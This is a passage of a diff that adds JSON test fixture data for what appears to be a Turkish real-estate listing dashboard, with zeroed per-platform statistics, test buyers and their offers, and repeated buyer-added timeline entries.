+        "note": "Alıcı test notu: Villa ile çok ilgilendi.",
+        "listingTitle": "Beytepe 4+1 Özel Bahçeli Villa",
+        "createdAt": "01.11.2026 10:31"
+      }
+    ],
+    "timeline": [
+      {
+        "id": "t_1793518271",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Ahmet Yılmaz (Test Alıcı)",
+        "note": "Teklif: 14.500.000 ₺ | Aşama: Teklif Verildi",
+        "date": "01.11.2026 10:31",
+        "author": "Yiğit Narin"
+      }
+    ]
+  },
+  "test_phase1_listing": {
+    "refId": "test_phase1_listing",
+    "platform_stats": [
+      {
+        "platform": "SAHIBINDEN",
+        "logo": "🟡",
+        "views": 0,
+        "favorites": 0,
+        "messages": 0,
+        "calls": 0,
+        "influence": 0,
+        "score": 0
+      },
+      {
+        "platform": "HEPSIEMLAK",
+        "logo": "🔴",
+        "views": 0,
+        "favorites": 0,
+        "messages": 0,
+        "calls": 0,
+        "influence": 0,
+        "score": 0
+      },
+      {
+        "platform": "EMLAKJET",
+        "logo": "🟣",
+        "views": 0,
+        "favorites": 0,
+        "messages": 0,
+        "calls": 0,
+        "influence": 0,
+        "score": 0
+      },
+      {
+        "platform": "COLDWELL BANKER",
+        "logo": "🔵",
+        "views": 0,
+        "favorites": 0,
+        "messages": 0,
+        "calls": 0,
+        "influence": 0,
+        "score": 0
+      },
+      {
+        "platform": "BRANDA / AFİŞ",
+        "logo": "🟠",
+        "views": 0,
+        "favorites": 0,
+        "messages": 0,
+        "calls": 0,
+        "influence": 0,
+        "score": 0
+      },
+      {
+        "platform": "SOSYAL MEDYA & AD",
+        "logo": "🟢",
+        "views": 0,
+        "favorites": 0,
+        "messages": 0,
+        "calls": 0,
+        "influence": 0,
+        "score": 0
+      }
+    ],
+    "buyers": [],
+    "timeline": [
+      {
+        "id": "t_1793524717",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Burak Çetin (Faz 1 Test Alıcısı)",
+        "note": "Teklif: 18.500.000 ₺ | Aşama: Teklif Verildi",
+        "date": "01.11.2026 12:18",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793524546",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Burak Çetin (Faz 1 Test Alıcısı)",
+        "note": "Teklif: 18.500.000 ₺ | Aşama: Teklif Verildi",
+        "date": "01.11.2026 12:15",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793524468",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Burak Çetin (Faz 1 Test Alıcısı)",
+        "note": "Teklif: 18.500.000 ₺ | Aşama: Teklif Verildi",
+        "date": "01.11.2026 12:14",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793524418",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Burak Çetin (Faz 1 Test Alıcısı)",
+        "note": "Teklif: 18.500.000 ₺ | Aşama: Teklif Verildi",
+        "date": "01.11.2026 12:13",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793524318",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Burak Çetin (Faz 1 Test Alıcısı)",
+        "note": "Teklif: 18.500.000 ₺ | Aşama: Teklif Verildi",
+        "date": "01.11.2026 12:11",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793524281",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Burak Çetin (Faz 1 Test Alıcısı)",
+        "note": "Teklif: 18.500.000 ₺ | Aşama: Teklif Verildi",
+        "date": "01.11.2026 12:11",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793524185",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Burak Çetin (Faz 1 Test Alıcısı)",
+        "note": "Teklif: 18.500.000 ₺ | Aşama: Teklif Verildi",
+        "date": "01.11.2026 12:09",
+        "author": "Yiğit Narin"
+      }
+    ]
+  },
+  "test_listing_1793524729": {
+    "refId": "test_listing_1793524729",
+    "platform_stats": [
+      {
+        "platform": "SAHIBINDEN",
+        "logo": "🟡",
+        "views": 0,
+        "favorites": 0,
+        "messages": 0,
+        "calls": 0,
+        "influence": 0,
+        "score": 0
+      },
+      {
+        "platform": "HEPSIEMLAK",
+        "logo": "🔴",
+        "views": 0,
+        "favorites": 0,
+        "messages": 0,
+        "calls": 0,
+        "influence": 0,
+        "score": 0
+      },
+      {
+        "platform": "EMLAKJET",
+        "logo": "🟣",
+        "views": 0,
+        "favorites": 0,
+        "messages": 0,
+        "calls": 0,
+        "influence": 0,
+        "score": 0
+      },
+      {
+        "platform": "COLDWELL BANKER",
+        "logo": "🔵",
+        "views": 0,
+        "favorites": 0,
+        "messages": 0,
+        "calls": 0,
+        "influence": 0,
+        "score": 0
+      },
+      {
+        "platform": "BRANDA / AFİŞ",
+        "logo": "🟠",
+        "views": 0,
+        "favorites": 0,
+        "messages": 0,
+        "calls": 0,
+        "influence": 0,
+        "score": 0
+      },
+      {
+        "platform": "SOSYAL MEDYA & AD",
+        "logo": "🟢",
+        "views": 0,
+        "favorites": 0,
+        "messages": 0,
+        "calls": 0,
+        "influence": 0,
+        "score": 0
+      }
+    ],
+    "buyers": [
+      {
+        "id": "b_1793524729_848",
+        "refId": "test_listing_1793524729",
+        "name": "Ahmet Yılmaz (Test Alıcı)",
+        "phone": "+90 532 999 88 77",
+        "offer": "14.500.000 ₺",
+        "stage": "Teklif Verildi",
+        "note": "Alıcı test notu: Villa ile çok ilgilendi.",
+        "listingTitle": "Beytepe 4+1 Özel Bahçeli Villa",
+        "createdAt": "01.11.2026 12:18"
+      }
+    ],
+    "timeline": [
+      {
+        "id": "t_1793524729",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Ahmet Yılmaz (Test Alıcı)",
+        "note": "Teklif: 14.500.000 ₺ | Aşama: Teklif Verildi",
+        "date": "01.11.2026 12:18",
         "author": "Yiğit Narin"
       }
     ]
